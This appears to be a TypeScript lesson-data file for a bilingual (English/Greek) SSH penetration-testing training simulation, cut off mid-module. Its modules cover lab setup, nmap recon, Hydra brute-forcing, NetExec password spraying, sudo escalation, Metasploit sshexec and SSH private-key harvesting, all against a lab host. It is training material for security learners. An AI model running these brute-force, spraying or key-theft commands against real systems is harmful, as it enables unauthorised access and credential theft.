import type { Module } from "./lessons";
import type { SshTerminal } from "../lib/ssh";
import { SSH_FLAGS } from "../lib/ssh";

// "SSH Penetration Testing (Port 22)" campaign. It replicates the standard SSH
// attack/defence lifecycle as a safe, guided simulation. All descriptive text is
// original; only tool names, flags and protocol facts (which are not copyrightable)
// are reproduced. Each module seeds the shared session to the expected prior state.

const seedSetup = (t: SshTerminal) => {
  t.s.osInstalled = true;
  t.s.serviceRunning = true;
};
const seedRecon = (t: SshTerminal) => {
  seedSetup(t);
  t.s.portScanned = true;
};
const seedCreds = (t: SshTerminal) => {
  seedRecon(t);
  t.s.authEnum = true;
  t.s.hydraCracked = true;
};
const seedShell = (t: SshTerminal) => {
  seedCreds(t);
  t.s.location = "remote";
  t.s.remoteUser = "pentest";
  t.s.loggedIn = true;
  t.cwd = "/home/pentest";
};

export const SSH_MODULES: Module[] = [
  // 1 — LAB SETUP
  {
    id: "ssh-setup",
    order: 1,
    icon: "terminal",
    color: "from-iron-500 to-zinc-600",
    difficulty: 1,
    tool: "terminal",
    title: { en: "Lab Setup: Install OpenSSH", el: "Στήσιμο Lab: Εγκατάσταση OpenSSH" },
    subtitle: { en: "Stand up the target SSH server", el: "Σήκωσε τον server SSH στόχο" },
    badge: { en: "Lab Builder", el: "Κατασκευαστής Lab" },
    theory: [
      {
        heading: { en: "Why build the lab yourself", el: "Γιατί να στήσεις μόνος σου το lab" },
        body: {
          en: "A pentest only makes sense against a target you are allowed to attack. In this campaign you first provision that target: an Ubuntu 22.04 server (hostname 'ignite'). Understanding how the service is installed and started also teaches you what the defender configured — and where it can go wrong.",
          el: "Ένα pentest έχει νόημα μόνο σε στόχο που επιτρέπεται να επιτεθείς. Εδώ πρώτα στήνεις αυτόν τον στόχο: έναν Ubuntu 22.04 server (hostname 'ignite'). Το πώς εγκαθίσταται και ξεκινά η υπηρεσία σου δείχνει και τι ρύθμισε ο αμυνόμενος — και πού μπορεί να πάει στραβά.",
        },
      },
      {
        heading: { en: "Installing the server", el: "Εγκατάσταση του server" },
        body: {
          en: "On Debian/Ubuntu the SSH server is the 'openssh-server' package. 'apt install openssh-server' pulls it in along with the SFTP subsystem and helpers. By default it listens on TCP/22 and — importantly — permits password authentication, which is exactly the weakness the rest of this campaign exploits.",
          el: "Σε Debian/Ubuntu ο SSH server είναι το πακέτο 'openssh-server'. Το 'apt install openssh-server' το φέρνει μαζί με το SFTP subsystem και βοηθητικά. Από προεπιλογή ακούει στο TCP/22 και — σημαντικό — επιτρέπει password authentication, ακριβώς την αδυναμία που εκμεταλλεύεται η καμπάνια.",
        },
      },
      {
        heading: { en: "Enabling & verifying the service", el: "Ενεργοποίηση & επαλήθευση" },
        body: {
          en: "Installed is not the same as running. 'systemctl enable --now ssh' starts it immediately and on every boot. Confirm it is live with 'systemctl status ssh' (look for 'active (running)'). Once it's listening on 22, the target is ready to assess.",
          el: "Εγκατεστημένο δεν σημαίνει ότι τρέχει. Το 'systemctl enable --now ssh' το ξεκινά άμεσα και σε κάθε boot. Επιβεβαίωσε ότι είναι ζωντανό με 'systemctl status ssh' (ψάξε 'active (running)'). Μόλις ακούει στο 22, ο στόχος είναι έτοιμος.",
        },
        tip: {
          en: "Default config = password auth ON. Remember this — the final module will turn it OFF.",
          el: "Προεπιλογή = password auth ON. Θυμήσου το — η τελευταία ενότητα θα το κλείσει.",
        },
      },
    ],
    cheats: [
      { cmd: "apt install openssh-server", desc: { en: "install the SSH server", el: "εγκατάσταση SSH server" } },
      { cmd: "systemctl enable --now ssh", desc: { en: "start & enable at boot", el: "εκκίνηση & στο boot" } },
      { cmd: "systemctl status ssh", desc: { en: "verify it's running", el: "επιβεβαίωση λειτουργίας" } },
    ],
    tasks: [
      {
        id: "ssh-install",
        instruction: { en: "Install the OpenSSH server package on the target.", el: "Εγκατέστησε το πακέτο OpenSSH server στον στόχο." },
        hint: { en: "apt install openssh-server", el: "apt install openssh-server" },
        explain: {
          en: "WHY: There's nothing to attack until the service exists. HOW: 'apt install openssh-server' installs sshd and its subsystems on Debian/Ubuntu.",
          el: "ΓΙΑΤΙ: Δεν υπάρχει στόχος μέχρι να υπάρχει η υπηρεσία. ΠΩΣ: 'apt install openssh-server' εγκαθιστά το sshd και τα subsystems σε Debian/Ubuntu.",
        },
        check: (s) => s.osInstalled,
      },
      {
        id: "ssh-service",
        instruction: { en: "Start the SSH service and verify it is listening.", el: "Ξεκίνα την υπηρεσία SSH και επιβεβαίωσε ότι ακούει." },
        hint: { en: "systemctl enable --now ssh   then   systemctl status ssh", el: "systemctl enable --now ssh   μετά   systemctl status ssh" },
        explain: {
          en: "WHY: An installed-but-stopped service exposes nothing. HOW: 'systemctl enable --now ssh' starts it; 'systemctl status ssh' shows 'active (running)' on port 22.",
          el: "ΓΙΑΤΙ: Μια εγκατεστημένη αλλά σταματημένη υπηρεσία δεν εκθέτει τίποτα. ΠΩΣ: 'systemctl enable --now ssh' την ξεκινά· 'systemctl status ssh' δείχνει 'active (running)' στη θύρα 22.",
        },
        check: (s) => s.serviceRunning,
      },
    ],
    challenges: [
      {
        title: { en: "Bring the Target Online", el: "Φέρε τον Στόχο Online" },
        brief: {
          en: "Provision the full service from scratch: install the OpenSSH server package AND start the daemon so it is actively listening on the network.",
          el: "Στήσε όλη την υπηρεσία από την αρχή: εγκατέστησε το πακέτο OpenSSH server ΚΑΙ ξεκίνα τον daemon ώστε να ακούει ενεργά στο δίκτυο.",
        },
        success: { en: "Target is live and listening on 22 — the assessment can begin.", el: "Ο στόχος είναι ζωντανός και ακούει στο 22 — η αξιολόγηση μπορεί να ξεκινήσει." },
        check: (s) => s.osInstalled && s.serviceRunning,
      },
      {
        title: { en: "Know the Default Posture", el: "Γνώρισε την Προεπιλεγμένη Στάση" },
        brief: {
          en: "Before attacking, verify the service really is up by querying its status — confirming the running daemon you'll be testing.",
          el: "Πριν την επίθεση, επιβεβαίωσε ότι η υπηρεσία είναι όντως πάνω ρωτώντας την κατάστασή της — επιβεβαιώνοντας τον daemon που θα δοκιμάσεις.",
        },
        success: { en: "Status confirmed: sshd active with password auth enabled by default.", el: "Κατάσταση επιβεβαιωμένη: sshd ενεργό με password auth από προεπιλογή." },
        check: (s) => s.serviceRunning,
      },
    ],
  },

  // 2 — RECON
  {
    id: "ssh-recon",
    order: 2,
    sshInit: seedSetup,
    icon: "radar",
    color: "from-neon-cyan to-blue-600",
    difficulty: 2,
    tool: "both",
    title: { en: "Recon: Fingerprint the Service", el: "Αναγνώριση: Ταυτοποίηση Υπηρεσίας" },
    subtitle: { en: "Map port 22 and its auth surface", el: "Χαρτογράφησε τη θύρα 22 και το auth της" },
    badge: { en: "SSH Scout", el: "Ανιχνευτής SSH" },
    theory: [
      {
        heading: { en: "Why SSH is a prime target", el: "Γιατί το SSH είναι πρώτος στόχος" },
        body: {
          en: "SSH (Secure Shell) gives encrypted remote access and is often the ONLY port open on a hardened server — which makes it a high-value target. In this lab you are a Kali attacker (192.168.1.17) assessing an Ubuntu server named 'ignite' (192.168.1.9). Everything is a safe simulation.",
          el: "Το SSH (Secure Shell) δίνει κρυπτογραφημένη απομακρυσμένη πρόσβαση και συχνά είναι η ΜΟΝΗ ανοιχτή θύρα σε έναν θωρακισμένο server — γι' αυτό είναι στόχος υψηλής αξίας. Εδώ είσαι επιτιθέμενος Kali (192.168.1.17) που αξιολογεί έναν Ubuntu server 'ignite' (192.168.1.9). Όλα είναι ασφαλής προσομοίωση.",
        },
      },
      {
        heading: { en: "Version detection with nmap", el: "Ανίχνευση έκδοσης με nmap" },
        body: {
          en: "Always confirm WHAT is running before attacking. 'nmap -sV -p 22 <ip>' probes port 22 and reports the exact service and version — here OpenSSH 8.9p1 on Ubuntu. The precise version tells you which known issues and default behaviours apply.",
          el: "Πάντα επιβεβαίωσε ΤΙ τρέχει πριν επιτεθείς. Το 'nmap -sV -p 22 <ip>' εξετάζει τη θύρα 22 και αναφέρει την ακριβή υπηρεσία και έκδοση — εδώ OpenSSH 8.9p1 σε Ubuntu. Η ακριβής έκδοση δείχνει ποια γνωστά θέματα και προεπιλογές ισχύουν.",
        },
      },
      {
        heading: { en: "Enumerate auth methods", el: "Απαρίθμηση μεθόδων auth" },
        body: {
          en: "An SSH server can accept passwords, public keys, or both. The nmap script 'ssh-auth-methods' reveals which are enabled. If 'password' is accepted, the server is brute-forceable — the single most important finding of this phase.",
          el: "Ένας SSH server δέχεται κωδικούς, δημόσια κλειδιά ή και τα δύο. Το script 'ssh-auth-methods' του nmap αποκαλύπτει ποια είναι ενεργά. Αν δέχεται 'password', ο server είναι brute-forceable — το πιο σημαντικό εύρημα αυτής της φάσης.",
        },
        tip: {
          en: "Watch the Topology tab: the server node lights up once you've scanned it.",
          el: "Δες την καρτέλα Topology: ο κόμβος του server ανάβει μόλις τον σαρώσεις.",
        },
      },
    ],
    cheats: [
      { cmd: "nmap -sV -p 22 192.168.1.9", desc: { en: "detect SSH version", el: "ανίχνευση έκδοσης SSH" } },
      { cmd: "nmap --script ssh-auth-methods -p 22 <ip>", desc: { en: "list auth methods", el: "λίστα μεθόδων auth" } },
      { cmd: "nmap -p- <ip>", desc: { en: "full port sweep", el: "πλήρης σάρωση θυρών" } },
    ],
    tasks: [
      {
        id: "ssh-version",
        instruction: { en: "Fingerprint the SSH service with a version scan of port 22.", el: "Ταυτοποίησε την υπηρεσία SSH με σάρωση έκδοσης στη θύρα 22." },
        hint: { en: "nmap -sV -p 22 192.168.1.9", el: "nmap -sV -p 22 192.168.1.9" },
        explain: {
          en: "WHY: Knowing the exact service/version guides every later step. HOW: 'nmap -sV -p 22 192.168.1.9' runs version-detection probes against port 22 and prints 'OpenSSH 8.9p1'.",
          el: "ΓΙΑΤΙ: Η ακριβής υπηρεσία/έκδοση καθοδηγεί κάθε επόμενο βήμα. ΠΩΣ: 'nmap -sV -p 22 192.168.1.9' τρέχει ανίχνευση έκδοσης στη θύρα 22 και τυπώνει 'OpenSSH 8.9p1'.",
        },
        check: (s) => s.portScanned,
      },
      {
        id: "ssh-authmethods",
        instruction: { en: "Enumerate which authentication methods the server accepts.", el: "Απαρίθμησε ποιες μεθόδους auth δέχεται ο server." },
        hint: { en: 'nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 22 192.168.1.9', el: 'nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 22 192.168.1.9' },
        explain: {
          en: "WHY: If password auth is enabled, the server can be brute-forced. HOW: the 'ssh-auth-methods' NSE script lists 'publickey' and 'password' when both are allowed.",
          el: "ΓΙΑΤΙ: Αν το password auth είναι ενεργό, ο server είναι brute-forceable. ΠΩΣ: το script 'ssh-auth-methods' εμφανίζει 'publickey' και 'password' όταν επιτρέπονται και τα δύο.",
        },
        check: (s) => s.authEnum,
      },
    ],
    challenges: [
      {
        title: { en: "Confirm the Attack Surface", el: "Επιβεβαίωσε την Επιφάνεια Επίθεσης" },
        brief: {
          en: "Prove the service is exposed and brute-forceable: run a version scan AND enumerate the authentication methods so you know password login is accepted.",
          el: "Απόδειξε ότι η υπηρεσία είναι εκτεθειμένη και brute-forceable: τρέξε σάρωση έκδοσης ΚΑΙ απαρίθμησε τις μεθόδους auth ώστε να ξέρεις ότι δέχεται password login.",
        },
        success: { en: "Surface mapped — OpenSSH 8.9p1 with password auth. Capture the recon flag.", el: "Η επιφάνεια χαρτογραφήθηκε — OpenSSH 8.9p1 με password auth." },
        check: (s) => s.portScanned && s.authEnum && s.has(SSH_FLAGS.recon),
      },
      {
        title: { en: "Nothing Hides from a Full Scan", el: "Τίποτα δεν Κρύβεται από Πλήρη Σάρωση" },
        brief: {
          en: "Admins sometimes move SSH off port 22. Prove you can still find it by scanning the entire port range of the target.",
          el: "Οι admins μερικές φορές μετακινούν το SSH από τη θύρα 22. Απόδειξε ότι μπορείς να το βρεις σαρώνοντας όλο το εύρος θυρών του στόχου.",
        },
        success: { en: "Full-range scan complete — a non-standard port is no defence.", el: "Πλήρης σάρωση ολοκληρώθηκε — μη τυπική θύρα δεν είναι άμυνα." },
        check: (s) => s.fullScan,
      },
    ],
  },

  // 2 — CREDENTIAL ATTACK
  {
    id: "ssh-creds",
    order: 3,
    icon: "hammer",
    color: "from-rose-500 to-red-700",
    difficulty: 3,
    tool: "both",
    title: { en: "Credential Attacks", el: "Επιθέσεις Διαπιστευτηρίων" },
    subtitle: { en: "Brute-force & spray weak passwords", el: "Brute-force & spray αδύναμων κωδικών" },
    badge: { en: "Lock Picker", el: "Παραβιαστής" },
    sshInit: seedRecon,
    theory: [
      {
        heading: { en: "Password auth = brute-force risk", el: "Password auth = κίνδυνος brute-force" },
        body: {
          en: "Because the server accepts passwords, an attacker can try many combinations automatically. 'hydra' runs a dictionary attack across a list of usernames and passwords until one pair works. Weak, reused passwords fall in seconds.",
          el: "Επειδή ο server δέχεται κωδικούς, ο επιτιθέμενος μπορεί να δοκιμάσει πολλούς συνδυασμούς αυτόματα. Το 'hydra' κάνει επίθεση λεξικού σε λίστες χρηστών και κωδικών μέχρι να πετύχει ένα ζεύγος. Αδύναμοι, επαναχρησιμοποιημένοι κωδικοί πέφτουν σε δευτερόλεπτα.",
        },
      },
      {
        heading: { en: "Password spraying", el: "Password spraying" },
        body: {
          en: "Instead of many passwords against one user, spraying tries ONE common password against MANY users — avoiding lockouts. A modern tool like NetExec (nxc) also tells you useful context, such as whether the cracked account is in the 'sudo' group (instant root).",
          el: "Αντί για πολλούς κωδικούς σε έναν χρήστη, το spraying δοκιμάζει ΕΝΑΝ κοινό κωδικό σε ΠΟΛΛΟΥΣ χρήστες — αποφεύγοντας κλειδώματα. Ένα σύγχρονο εργαλείο όπως το NetExec (nxc) σου λέει και χρήσιμα στοιχεία, π.χ. αν ο λογαριασμός είναι στην ομάδα 'sudo' (άμεσο root).",
        },
        tip: {
          en: "The target user is 'pentest' with password '123' — and it's in the sudo group.",
          el: "Ο χρήστης-στόχος είναι 'pentest' με κωδικό '123' — και είναι στην ομάδα sudo.",
        },
      },
    ],
    cheats: [
      { cmd: "hydra -L users.txt -P pass.txt <ip> ssh", desc: { en: "SSH dictionary attack", el: "επίθεση λεξικού SSH" } },
      { cmd: "nxc ssh <ip> -u users.txt -p 123", desc: { en: "password spray", el: "password spray" } },
      { cmd: "hydra -l pentest -P rockyou.txt <ip> ssh", desc: { en: "target one user", el: "ένας χρήστης" } },
    ],
    tasks: [
      {
        id: "ssh-hydra",
        instruction: { en: "Brute-force SSH logins with Hydra and a wordlist.", el: "Κάνε brute-force στα SSH logins με Hydra και wordlist." },
        hint: { en: "hydra -L users.txt -P pass.txt 192.168.1.9 ssh", el: "hydra -L users.txt -P pass.txt 192.168.1.9 ssh" },
        explain: {
          en: "WHY: Password auth means unlimited guesses are possible. HOW: 'hydra -L users.txt -P pass.txt 192.168.1.9 ssh' tries each user/password pair and reports pentest:123.",
          el: "ΓΙΑΤΙ: Το password auth σημαίνει απεριόριστες δοκιμές. ΠΩΣ: 'hydra -L users.txt -P pass.txt 192.168.1.9 ssh' δοκιμάζει κάθε ζεύγος και αναφέρει pentest:123.",
        },
        check: (s) => s.hydraCracked,
      },
      {
        id: "ssh-spray",
        instruction: { en: "Password-spray with NetExec to confirm the account and its privileges.", el: "Κάνε password-spray με NetExec για να επιβεβαιώσεις τον λογαριασμό και τα προνόμιά του." },
        hint: { en: "nxc ssh 192.168.1.9 -u users.txt -p 123", el: "nxc ssh 192.168.1.9 -u users.txt -p 123" },
        explain: {
          en: "WHY: Spraying avoids lockouts and NetExec flags useful context. HOW: 'nxc ssh 192.168.1.9 -u users.txt -p 123' confirms pentest:123 and shows it's in the sudo group.",
          el: "ΓΙΑΤΙ: Το spraying αποφεύγει κλειδώματα και το NetExec δείχνει χρήσιμα στοιχεία. ΠΩΣ: 'nxc ssh 192.168.1.9 -u users.txt -p 123' επιβεβαιώνει pentest:123 και ότι είναι στην ομάδα sudo.",
        },
        check: (s) => s.sprayed,
      },
    ],
    challenges: [
      {
        title: { en: "Recover Valid Credentials", el: "Ανάκτησε Έγκυρα Διαπιστευτήρια" },
        brief: {
          en: "Crack your way in: use a brute-force or spray attack against SSH to recover a working username and password for the target.",
          el: "Σπάσε την είσοδο: χρησιμοποίησε brute-force ή spray στο SSH για να ανακτήσεις έγκυρο όνομα χρήστη και κωδικό.",
        },
        success: { en: "Credentials recovered — pentest:123 unlocks everything that follows.", el: "Τα διαπιστευτήρια ανακτήθηκαν — pentest:123 ξεκλειδώνει τα πάντα." },
        check: (s) => s.hydraCracked && s.has(SSH_FLAGS.creds),
      },
      {
        title: { en: "Confirm Privilege Context", el: "Επιβεβαίωσε το Προνομιακό Πλαίσιο" },
        brief: {
          en: "A password is more valuable if the account is powerful. Use the spray tool to confirm the cracked user's group membership before you log in.",
          el: "Ένας κωδικός αξίζει περισσότερο αν ο λογαριασμός είναι ισχυρός. Χρησιμοποίησε το εργαλείο spray για να επιβεβαιώσεις την ομάδα του χρήστη πριν συνδεθείς.",
        },
        success: { en: "Confirmed: the account is in the sudo group — root is one step away.", el: "Επιβεβαιώθηκε: ο λογαριασμός είναι στην ομάδα sudo — το root είναι ένα βήμα μακριά." },
        check: (s) => s.sprayed,
      },
    ],
  },

  // 3 — INITIAL ACCESS
  {
    id: "ssh-access",
    order: 4,
    icon: "terminal",
    color: "from-ember-500 to-ember-700",
    difficulty: 3,
    tool: "both",
    title: { en: "Initial Access", el: "Αρχική Πρόσβαση" },
    subtitle: { en: "Log in, run commands, confirm sudo", el: "Σύνδεση, εκτέλεση εντολών, έλεγχος sudo" },
    badge: { en: "Foothold", el: "Πάτημα" },
    sshInit: seedCreds,
    theory: [
      {
        heading: { en: "Interactive login", el: "Διαδραστική σύνδεση" },
        body: {
          en: "With valid credentials, 'ssh pentest@192.168.1.9' opens a full interactive shell on the target — your foothold. From here you can enumerate the system, read files, and plan privilege escalation.",
          el: "Με έγκυρα διαπιστευτήρια, το 'ssh pentest@192.168.1.9' ανοίγει πλήρες διαδραστικό shell στον στόχο — το πάτημά σου. Από εδώ απαριθμείς το σύστημα, διαβάζεις αρχεία και σχεδιάζεις ανύψωση προνομίων.",
        },
      },
      {
        heading: { en: "Non-interactive command execution", el: "Μη διαδραστική εκτέλεση εντολών" },
        body: {
          en: "You don't always need a full shell. 'ssh user@host \"command\"' runs a single command and returns its output — ideal for quick, scriptable checks. NetExec's '-x' flag does the same over an authenticated session.",
          el: "Δεν χρειάζεσαι πάντα πλήρες shell. Το 'ssh user@host \"command\"' εκτελεί μία εντολή και επιστρέφει την έξοδο — ιδανικό για γρήγορους, scriptable ελέγχους. Το flag '-x' του NetExec κάνει το ίδιο σε authenticated session.",
        },
      },
      {
        heading: { en: "Confirm you can escalate", el: "Επιβεβαίωσε ότι μπορείς να ανέβεις" },
        body: {
          en: "Once inside, check your rights with 'id' and 'sudo -l'. The pentest user is in the 'sudo' group, so 'sudo su' yields root with the same password — no extra exploit needed.",
          el: "Μόλις μπεις, έλεγξε τα δικαιώματά σου με 'id' και 'sudo -l'. Ο χρήστης pentest είναι στην ομάδα 'sudo', οπότε 'sudo su' δίνει root με τον ίδιο κωδικό — χωρίς επιπλέον exploit.",
        },
        tip: {
          en: "The Topology tab shows the server node flip to 'pentest', then 'ROOT' once you escalate.",
          el: "Η καρτέλα Topology δείχνει τον κόμβο server να γίνεται 'pentest', μετά 'ROOT' μόλις ανέβεις.",
        },
      },
    ],
    cheats: [
      { cmd: "ssh pentest@192.168.1.9", desc: { en: "interactive login (pass: 123)", el: "διαδραστική σύνδεση (κωδ: 123)" } },
      { cmd: 'ssh pentest@192.168.1.9 "id"', desc: { en: "run one remote command", el: "μία απομακρυσμένη εντολή" } },
      { cmd: "nxc ssh <ip> -u pentest -p 123 -x ifconfig", desc: { en: "exec via NetExec", el: "εκτέλεση μέσω NetExec" } },
      { cmd: "sudo -l / sudo su", desc: { en: "check & gain root", el: "έλεγχος & root" } },
    ],
    tasks: [
      {
        id: "ssh-login",
        instruction: { en: "Log into the target over SSH as pentest.", el: "Μπες στον στόχο μέσω SSH ως pentest." },
        hint: { en: "ssh pentest@192.168.1.9   →   password: 123", el: "ssh pentest@192.168.1.9   →   κωδικός: 123" },
        explain: {
          en: "WHY: Cracked creds are worthless until you use them for a shell. HOW: 'ssh pentest@192.168.1.9' then type '123' at the password prompt.",
          el: "ΓΙΑΤΙ: Τα σπασμένα creds δεν αξίζουν μέχρι να τα χρησιμοποιήσεις για shell. ΠΩΣ: 'ssh pentest@192.168.1.9' και μετά '123' στο prompt.",
        },
        check: (s) => s.loggedIn,
      },
      {
        id: "ssh-sudo",
        instruction: { en: "Confirm your privileges on the box with id or sudo -l.", el: "Επιβεβαίωσε τα προνόμιά σου με id ή sudo -l." },
        hint: { en: "id   (look for the sudo group)   or   sudo -l", el: "id   (ψάξε την ομάδα sudo)   ή   sudo -l" },
        explain: {
          en: "WHY: Knowing you're in the sudo group means root is trivial. HOW: 'id' lists your groups; 'sudo -l' lists what you may run as root.",
          el: "ΓΙΑΤΙ: Το να ξέρεις ότι είσαι στην ομάδα sudo σημαίνει ότι το root είναι εύκολο. ΠΩΣ: 'id' δείχνει τις ομάδες· 'sudo -l' δείχνει τι μπορείς ως root.",
        },
        check: (s) => s.sudoChecked,
      },
    ],
    challenges: [
      {
        title: { en: "Land a Shell & Loot", el: "Πάρε Shell & Λεηλάτησε" },
        brief: {
          en: "Get an interactive session on the target, then read the planted note somewhere under /tmp to capture the access flag.",
          el: "Πάρε διαδραστική συνεδρία στον στόχο, μετά διάβασε το σημείωμα κάπου στο /tmp για να πάρεις το flag πρόσβασης.",
        },
        success: { en: "Shell confirmed and the access flag is yours.", el: "Το shell επιβεβαιώθηκε και το flag πρόσβασης είναι δικό σου." },
        check: (s) => s.loggedIn && s.has(SSH_FLAGS.access),
      },
      {
        title: { en: "Run Without a Shell", el: "Εκτέλεσε Χωρίς Shell" },
        brief: {
          en: "Prove you can execute commands non-interactively. Use a single remote command (via ssh or NetExec) to read the target's network config without opening a full shell.",
          el: "Απόδειξε ότι εκτελείς εντολές μη διαδραστικά. Χρησιμοποίησε μία απομακρυσμένη εντολή (μέσω ssh ή NetExec) για να διαβάσεις τη δικτυακή ρύθμιση χωρίς πλήρες shell.",
        },
        success: { en: "Remote command executed — fast, quiet, scriptable access.", el: "Απομακρυσμένη εντολή εκτελέστηκε — γρήγορη, αθόρυβη, scriptable πρόσβαση." },
        check: (s) => s.remoteCmdRun,
      },
    ],
  },

  // 5 — METASPLOIT
  {
    id: "ssh-metasploit",
    order: 5,
    icon: "scan",
    color: "from-fuchsia-500 to-purple-700",
    difficulty: 4,
    tool: "terminal",
    title: { en: "Metasploit: Meterpreter & Harvest", el: "Metasploit: Meterpreter & Συλλογή" },
    subtitle: { en: "sshexec session + harvest SSH keys", el: "sshexec session + συλλογή κλειδιών SSH" },
    badge: { en: "Framework Operator", el: "Χειριστής Framework" },
    sshInit: seedCreds,
    theory: [
      {
        heading: { en: "Why use a framework", el: "Γιατί ένα framework" },
        body: {
          en: "A plain SSH login gives you a shell; Metasploit gives you a post-exploitation platform. The 'msfconsole' is the interactive driver: you select a module with 'use', configure it with 'set', then launch it with 'run' (or 'exploit').",
          el: "Ένα απλό SSH login σου δίνει shell· το Metasploit σου δίνει πλατφόρμα post-exploitation. Το 'msfconsole' είναι ο διαδραστικός οδηγός: επιλέγεις module με 'use', το ρυθμίζεις με 'set', και το εκτελείς με 'run' (ή 'exploit').",
        },
      },
      {
        heading: { en: "sshexec → Meterpreter", el: "sshexec → Meterpreter" },
        body: {
          en: "The 'exploit/multi/ssh/sshexec' module logs in with credentials you already recovered, drops a small stager, and opens a Meterpreter session — a rich agent for file browsing, process control and pivoting. Set rhosts/username/password, pick a payload, and run.",
          el: "Το module 'exploit/multi/ssh/sshexec' συνδέεται με τα διαπιστευτήρια που ήδη ανέκτησες, ρίχνει έναν μικρό stager και ανοίγει μια συνεδρία Meterpreter — έναν πλούσιο agent για αρχεία, διεργασίες και pivoting. Όρισε rhosts/username/password, διάλεξε payload και τρέξε.",
        },
      },
      {
        heading: { en: "Harvesting SSH keys", el: "Συλλογή κλειδιών SSH" },
        body: {
          en: "With a session open, post modules automate looting. 'post/multi/gather/ssh_creds' walks every ~/.ssh directory and downloads the public key, authorized_keys and the private key to your loot folder. A stolen key means persistent, password-independent access — even after passwords are disabled.",
          el: "Με ανοιχτή συνεδρία, τα post modules αυτοματοποιούν τη λεηλασία. Το 'post/multi/gather/ssh_creds' διατρέχει κάθε φάκελο ~/.ssh και κατεβάζει το δημόσιο κλειδί, το authorized_keys και το ιδιωτικό κλειδί στον φάκελο loot. Ένα κλεμμένο κλειδί σημαίνει μόνιμη πρόσβαση ανεξάρτητη κωδικού — ακόμα κι όταν οι κωδικοί απενεργοποιηθούν.",
        },
        tip: {
          en: "Flow inside msfconsole: use → set → run → (session) → use post/... → set session 1 → run.",
          el: "Ροή στο msfconsole: use → set → run → (session) → use post/... → set session 1 → run.",
        },
      },
    ],
    cheats: [
      { cmd: "msfconsole", desc: { en: "launch the framework", el: "εκκίνηση framework" } },
      { cmd: "use exploit/multi/ssh/sshexec", desc: { en: "select the exploit", el: "επιλογή exploit" } },
      { cmd: "set rhosts/username/password ; run", desc: { en: "configure & launch", el: "ρύθμιση & εκτέλεση" } },
      { cmd: "use post/multi/gather/ssh_creds", desc: { en: "harvest keys", el: "συλλογή κλειδιών" } },
    ],
    tasks: [
      {
        id: "ssh-meterpreter",
        instruction: { en: "Open a Meterpreter session with the sshexec module.", el: "Άνοιξε συνεδρία Meterpreter με το module sshexec." },
        hint: { en: "msfconsole → use exploit/multi/ssh/sshexec → set rhosts/username/password → run", el: "msfconsole → use exploit/multi/ssh/sshexec → set rhosts/username/password → run" },
        explain: {
          en: "WHY: A Meterpreter session is a full post-exploitation agent, not just a shell. HOW: in msfconsole, 'use exploit/multi/ssh/sshexec', set the creds, then 'run' to open session 1.",
          el: "ΓΙΑΤΙ: Μια συνεδρία Meterpreter είναι πλήρης agent post-exploitation, όχι απλό shell. ΠΩΣ: στο msfconsole, 'use exploit/multi/ssh/sshexec', όρισε τα creds και 'run' για τη συνεδρία 1.",
        },
        check: (s) => s.meterpreter,
      },
      {
        id: "ssh-harvest",
        instruction: { en: "Harvest the target's SSH keys with the ssh_creds post module.", el: "Μάζεψε τα κλειδιά SSH του στόχου με το post module ssh_creds." },
        hint: { en: "use post/multi/gather/ssh_creds → set session 1 → run", el: "use post/multi/gather/ssh_creds → set session 1 → run" },
        explain: {
          en: "WHY: Automating key theft gives persistent access independent of passwords. HOW: with a session open, 'use post/multi/gather/ssh_creds', 'set session 1', then 'run' to loot id_rsa.",
          el: "ΓΙΑΤΙ: Η αυτοματοποιημένη κλοπή κλειδιών δίνει μόνιμη πρόσβαση ανεξάρτητη κωδικών. ΠΩΣ: με ανοιχτή συνεδρία, 'use post/multi/gather/ssh_creds', 'set session 1', μετά 'run' για λεηλασία του id_rsa.",
        },
        check: (s) => s.sshCredsHarvested,
      },
    ],
    challenges: [
      {
        title: { en: "Automate the Compromise", el: "Αυτοματοποίησε την Παραβίαση" },
        brief: {
          en: "Use the framework end-to-end: open a Meterpreter session via sshexec, then run the post module that steals the target's private key — capturing the Metasploit flag.",
          el: "Χρησιμοποίησε το framework από άκρη σε άκρη: άνοιξε συνεδρία Meterpreter μέσω sshexec, μετά τρέξε το post module που κλέβει το ιδιωτικό κλειδί — παίρνοντας το flag του Metasploit.",
        },
        success: { en: "Session opened and keys harvested — persistent access secured.", el: "Συνεδρία ανοιχτή και κλειδιά μαζεμένα — μόνιμη πρόσβαση εξασφαλισμένη." },
        check: (s) => s.meterpreter && s.sshCredsHarvested && s.has(SSH_FLAGS.metasploit),
      },
      {
        title: { en: "Session Before Loot", el: "Συνεδρία Πριν τη Λεηλασία" },
        brief: {
          en: "Post modules require an active session. Prove you understand the order of operations by establishing the Meterpreter session that the credential-harvesting module depends on.",
          el: "Τα post modules απαιτούν ενεργή συνεδρία. Απόδειξε ότι κατανοείς τη σειρά των ενεργειών ανοίγοντας τη συνεδρία Meterpreter από την οποία εξαρτάται το module συλλογής.",
        },
        success: { en: "Meterpreter session confirmed — the framework is attached to the target.", el: "Συνεδρία Meterpreter επιβεβαιωμένη — το framework συνδέθηκε στον στόχο." },
        check: (s) => s.meterpreter,
      },
    ],
  },

  // 6 — KEYS
  {
    id: "ssh-keys",
    order: 6,
    icon: "key",
    color: "from-amber-400 to-yellow-600",
    difficulty: 4,
    tool: "terminal",
    title: { en: "Keys & Passphrase Cracking", el: "Κλειδιά & Σπάσιμο Passphrase" },
    subtitle: { en: "Keypairs, authorized_keys, ssh2john", el: "Ζεύγη κλειδιών, authorized_keys, ssh2john" },
    badge: { en: "Key Master", el: "Κλειδοκράτορας" },
    sshInit: seedShell,
    theory: [
      {
        heading: { en: "Key-based authentication", el: "Auth με κλειδιά" },
        body: {
          en: "Public-key auth is stronger than passwords: the private key never crosses the network and can't be brute-forced remotely. Generate a pair with 'ssh-keygen', then append the public key to '~/.ssh/authorized_keys' so the server trusts the matching private key.",
          el: "Το auth με δημόσιο κλειδί είναι ισχυρότερο από κωδικούς: το ιδιωτικό κλειδί δεν περνά ποτέ από το δίκτυο και δεν γίνεται brute-force απομακρυσμένα. Δημιούργησε ζεύγος με 'ssh-keygen', μετά πρόσθεσε το δημόσιο κλειδί στο '~/.ssh/authorized_keys' ώστε ο server να εμπιστεύεται το αντίστοιχο ιδιωτικό.",
        },
      },
      {
        heading: { en: "Stolen keys = persistent access", el: "Κλεμμένα κλειδιά = μόνιμη πρόσβαση" },
        body: {
          en: "If you capture a private key, 'ssh -i id_rsa pentest@host' logs in without a password. A key must have strict permissions ('chmod 600 id_rsa') or SSH refuses to use it.",
